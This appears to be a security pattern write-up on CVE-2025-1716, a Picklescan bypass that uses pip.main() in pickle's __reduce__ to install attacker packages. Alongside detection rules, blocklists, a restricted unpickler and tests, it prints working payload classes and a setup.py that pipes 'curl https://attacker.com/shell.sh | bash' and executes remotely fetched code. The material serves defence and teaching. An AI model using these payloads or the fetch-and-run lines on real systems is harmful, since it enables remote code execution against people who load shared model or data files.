# Pickle Bypass via pip.main()

## Pattern Overview

| Attribute | Value |
|-----------|-------|
| **Pattern Class** | `deserialization/pickle-pip-bypass` |
| **Severity** | MEDIUM-HIGH |
| **Score** | 7/10 |
| **CVSS** | Variable (bypass technique) |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **Languages** | Python |
| **Source CVE** | CVE-2025-1716 (Picklescan) |
| **Status** | Patched in Picklescan; underlying pickle risk remains |

## Description

This pattern describes a technique to bypass static analysis security tools (like Picklescan) that scan pickle files for malicious payloads. By using `pip.main()` as the callable function in pickle's `__reduce__` method, attackers can achieve remote code execution while evading detection.

The technique works because:
1. Security scanners whitelist `pip` as a legitimate package management tool
2. `pip.main()` can install arbitrary packages, including from attacker-controlled URLs
3. Installed packages execute code during installation (`setup.py`, entry points)

This is particularly dangerous in ML/AI contexts where pickle files are routinely shared (model checkpoints, datasets, saved objects).

## Technical Details

### How Pickle Deserialization Works

Python's pickle module allows arbitrary object serialization. When unpickling, the `__reduce__` method can specify a callable to invoke:

```python
import pickle

class Exploit:
    def __reduce__(self):
        # Returns: (callable, args_tuple)
        return (os.system, ("whoami",))

# When unpickled:
pickle.loads(pickle.dumps(Exploit()))
# Executes: os.system("whoami")
```

### The pip.main() Bypass

Traditional pickle exploits use obvious dangerous callables (`os.system`, `subprocess.Popen`, `eval`). Security scanners detect these. The bypass uses `pip.main()`:

```python
import pip

class Exploit:
    def __reduce__(self):
        return pip.main, ([
            'install',
            'git+https://github.com/attacker/malicious-package',
            '--quiet',
            '--no-input',
            '--exists-action', 'i'  # Ignore if exists
        ],)

# When unpickled:
# 1. pip.main() is called
# 2. Malicious package is downloaded and installed
# 3. Package's setup.py executes attacker code
```

### Why This Bypasses Scanners

From the CVE-2025-1716 analysis:
> "Since pip is a 'legitimate package operation,' it evades detection that would typically flag suspicious function calls."

Picklescan and similar tools maintain blocklists of dangerous functions:
- `os.system` - BLOCKED
- `subprocess.Popen` - BLOCKED
- `eval`, `exec` - BLOCKED
- `pip.main` - NOT BLOCKED (until patched)

### Malicious Package Structure

```python
# setup.py in attacker's package
import os
import setuptools

# Execute during installation
os.system("curl https://attacker.com/shell.sh | bash")

# Or more stealthily:
import urllib.request
exec(urllib.request.urlopen('https://attacker.com/payload.py').read())

setuptools.setup(
    name='innocent-package',
    version='1.0.0',
    packages=[],
)
```

### Complete Attack Payload

```python
import pickle
import pip

class MaliciousPayload:
    def __reduce__(self):
        return pip.main, ([
            'install',
            '--quiet',
            '--no-warn-script-location',
            '--no-input',
            '--exists-action', 'i',
            '--target', '/tmp/pip_packages',
            'git+https://github.com/attacker/backdoor.git'
        ],)

# Create malicious pickle file
with open('model.pkl', 'wb') as f:
    pickle.dump(MaliciousPayload(), f)

# When victim loads: pickle.load(open('model.pkl', 'rb'))
# → pip installs malicious package → RCE
```

### Variant: Using pip._internal

```python
class ExploitVariant:
    def __reduce__(self):
        # Using internal pip module to avoid top-level detection
        import pip._internal.cli.main
        return pip._internal.cli.main.main, ([
            'install', 'malicious-package'
        ],)
```

### Variant: Chained with tempfile

```python
import tempfile
import pip

class ExploitChained:
    def __reduce__(self):
        # First write requirements.txt, then pip install
        return exec, ("""
import tempfile, pip
with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
    f.write('git+https://github.com/attacker/evil.git')
    f.flush()
    pip.main(['install', '-r', f.name, '-q'])
""",)
```

## Attack Vectors

### Vector 1: ML Model Files

```python
# Attacker shares "trained model" on Hugging Face, Kaggle, etc.
# model.pkl contains pip.main() payload

# Victim loads model:
import torch
model = torch.load('model.pkl')  # RCE!

# Or with joblib:
import joblib
model = joblib.load('model.pkl')  # RCE!
```

### Vector 2: Data Science Pipelines

```python
# Attacker contributes to shared dataset repository
# cached_data.pkl contains payload

# Victim's data pipeline:
import pandas as pd
df = pd.read_pickle('cached_data.pkl')  # RCE!
```

### Vector 3: API/Web Endpoints

```python
# Web app accepts pickled data
@app.route('/predict', methods=['POST'])
def predict():
    data = pickle.loads(request.data)  # RCE from request!
    return model.predict(data)
```

### Vector 4: Supply Chain via PyPI

```python
# Attacker publishes package that drops pickled payload
# package/data/config.pkl contains pip.main() exploit

# Victim installs package, later code loads config:
from package import load_config
config = load_config()  # Loads pickle → RCE!
```

## Detection

### Semgrep Rule Approach

```yaml
rules:
  - id: pickle-pip-main-payload
    patterns:
      - pattern-either:
          - pattern: |
              def __reduce__(self):
                  return pip.main, ...
          - pattern: |
              def __reduce__(self):
                  return pip._internal.$FUNC, ...
          - pattern: |
              def __reduce_ex__(self, $PROTO):
                  return pip.main, ...
    message: "Potential pickle exploit using pip.main() for code execution"
    languages: [python]
    severity: ERROR

  # Detect loading of untrusted pickle files
  - id: pickle-untrusted-source
    mode: taint
    pattern-sources:
      - pattern: requests.get(...).content
      - pattern: urllib.request.urlopen(...).read()
      - pattern: open($PATH, "rb").read()
      - pattern: request.data
      - pattern: request.files[...]
    pattern-sinks:
      - pattern: pickle.loads($DATA)
      - pattern: pickle.load($DATA)
      - pattern: torch.load($DATA)
      - pattern: joblib.load($DATA)
    message: "Untrusted data passed to pickle deserialization"
    languages: [python]
    severity: ERROR
```

### Static Analysis Enhancement

Add `pip.main` and variants to blocklists:

```python
# For Picklescan or similar tools
DANGEROUS_GLOBALS = {
    "os": ["system", "popen", "spawn*", "exec*"],
    "subprocess": ["*"],
    "builtins": ["eval", "exec", "compile"],
    "pip": ["main", "_internal"],  # ADD THIS
    "pip._internal": ["*"],        # ADD THIS
    "pip._internal.cli.main": ["main"],
}
```

### Runtime Monitoring

```python
# Hook pip.main to detect runtime exploitation
import pip
original_main = pip.main

def monitored_main(args):
    import logging
    logging.warning(f"pip.main called with args: {args}")

    # Check if this is during pickle load
    import traceback
    stack = traceback.extract_stack()
    if any('pickle' in frame.filename for frame in stack):
        raise SecurityError("pip.main called from pickle context!")

    return original_main(args)

pip.main = monitored_main
```

## Remediation

### Option 1: Never Unpickle Untrusted Data

```python
# The only truly safe approach
# Use alternative serialization formats

# Instead of pickle:
import json
data = json.loads(untrusted_input)

# For ML models, use safe formats:
# - ONNX
# - Safetensors
# - TorchScript (with restrictions)
# - Protocol Buffers
```

### Option 2: Restricted Unpickler

```python
import pickle
import io

class RestrictedUnpickler(pickle.Unpickler):
    """Unpickler that blocks dangerous modules"""

    BLOCKED_MODULES = {
        'os', 'subprocess', 'sys', 'builtins',
        'pip', 'pip._internal', 'pip._vendor',
        'setuptools', 'distutils',
        'importlib', 'code', 'codeop',
    }

    def find_class(self, module, name):
        # Block dangerous modules
        module_root = module.split('.')[0]
        if module_root in self.BLOCKED_MODULES:
            raise pickle.UnpicklingError(
                f"Blocked module: {module}.{name}"
            )

        # Only allow specific safe modules
        ALLOWED = {'numpy', 'pandas', 'sklearn'}
        if module_root not in ALLOWED:
            raise pickle.UnpicklingError(
                f"Module not in allowlist: {module}"
            )

        return super().find_class(module, name)

def safe_load(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

### Option 3: Use Safetensors for ML Models

```python
# Instead of torch.save/load
from safetensors.torch import save_file, load_file

# Save model (only tensors, no arbitrary objects)
save_file(model.state_dict(), "model.safetensors")

# Load model (guaranteed safe)
state_dict = load_file("model.safetensors")
model.load_state_dict(state_dict)
```

### Option 4: Hash Verification

```python
import hashlib
import pickle

# Known-good model hashes
TRUSTED_HASHES = {
    "model_v1.pkl": "sha256:abc123...",
    "model_v2.pkl": "sha256:def456...",
}

def verified_load(path):
    with open(path, 'rb') as f:
        data = f.read()

    # Compute hash
    actual_hash = f"sha256:{hashlib.sha256(data).hexdigest()}"

    # Verify against known-good
    if path not in TRUSTED_HASHES:
        raise ValueError(f"Unknown model: {path}")
    if actual_hash != TRUSTED_HASHES[path]:
        raise ValueError(f"Hash mismatch for {path}")

    # Safe to load
    return pickle.loads(data)
```

### Option 5: Sandboxed Execution

```python
import subprocess
import pickle
import json

def sandboxed_load(pickle_path):
    """Load pickle in isolated subprocess"""

    # Run in restricted subprocess
    result = subprocess.run(
        ['python', '-c', f'''
import pickle
import json
with open("{pickle_path}", "rb") as f:
    obj = pickle.load(f)
# Only return safe JSON-serializable data
print(json.dumps({{"type": str(type(obj)), "repr": repr(obj)[:1000]}}))
'''],
        capture_output=True,
        timeout=10,
        # Additional sandboxing: seccomp, containers, etc.
    )

    return json.loads(result.stdout)
```

## Testing

### Malicious Pickle Detection Test

```python
import pickle
import io

def test_pip_main_blocked():
    """Verify pip.main payloads are blocked"""

    class MaliciousPayload:
        def __reduce__(self):
            import pip
            return pip.main, (['install', 'evil'],)

    payload = pickle.dumps(MaliciousPayload())

    with pytest.raises(pickle.UnpicklingError, match="Blocked module"):
        safe_load(payload)

def test_pip_internal_blocked():
    """Verify pip._internal variants are blocked"""

    class MaliciousPayload:
        def __reduce__(self):
            import pip._internal.cli.main
            return pip._internal.cli.main.main, (['install', 'evil'],)

    payload = pickle.dumps(MaliciousPayload())

    with pytest.raises(pickle.UnpicklingError, match="Blocked module"):
        safe_load(payload)
```

### Integration Test

```python
def test_untrusted_model_rejected():
    """Loading untrusted model should fail safely"""

    # Create mock malicious model
    malicious_model_url = "https://untrusted-models.com/model.pkl"

    with pytest.raises(SecurityError):
        load_model_from_url(malicious_model_url)
```

## Real-World Context

### ML/AI Pipeline Risks

- Hugging Face Hub models (use safetensors)
- Kaggle dataset downloads
- Shared Jupyter notebooks with cached data
- Pre-trained model repositories

### Related CVEs

- **CVE-2025-1944, CVE-2025-1945**: Picklescan bypasses via filename manipulation
- **CVE-2024-3568**: Hugging Face Transformers arbitrary code execution
- **PyTorch CVE-2024-XXXXX**: `torch.load()` RCE

## References

- [GitHub Advisory: CVE-2025-1716 Picklescan Bypass](https://github.com/advisories/GHSA-655q-fx9r-782v)
- [Sonatype: Bypassing Picklescan](https://www.sonatype.com/blog/bypassing-picklescan-sonatype-discovers-four-vulnerabilities)
- [Miggo: CVE-2025-1716 Analysis](https://www.miggo.io/vulnerability-database/cve/CVE-2025-1716)
- [Python pickle Documentation](https://docs.python.org/3/library/pickle.html)
- [Trail of Bits: Never a Dull Moment with Pickle](https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-safe-deserialization-in-python/)
- [Safetensors Documentation](https://huggingface.co/docs/safetensors)

## Related Patterns

- `deserialization/pickle-ml` - General ML pickle deserialization risks
- `deserialization/yaml-load` - Unsafe YAML deserialization
- `supply-chain/malicious-package` - Malicious package installation
- `injection/code-execution` - General code injection patterns
